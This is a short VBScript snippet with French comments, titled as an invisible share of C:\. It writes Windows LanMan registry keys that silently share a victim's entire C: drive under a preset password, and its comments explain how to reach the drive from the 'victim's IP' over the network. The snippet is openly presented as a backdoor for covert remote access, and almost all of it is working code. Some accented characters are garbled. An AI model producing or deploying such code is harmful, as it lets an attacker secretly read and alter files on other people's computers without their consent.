'PARTAGE INVISIBLE DE C:\ 
' "\\IP_de_la_victime\C$" dans la fen�tre du voisinage r�seau, et � donner le mot de passe (ici c'est deux fois le charact�re ASCII num�ro 128, repr�sent� encod� dans le registre par la valeur 6837)
Set WshShell = CreateObject("WScript.Shell")WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Flags", 770, "REG_DWORD"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Parm1enc", 6837, "REG_BINARY"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Parm2enc", 0, "REG_BINARY"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Path", "C:\"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Remark", ""
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan\C$\Type", 0, "REG_DWORD"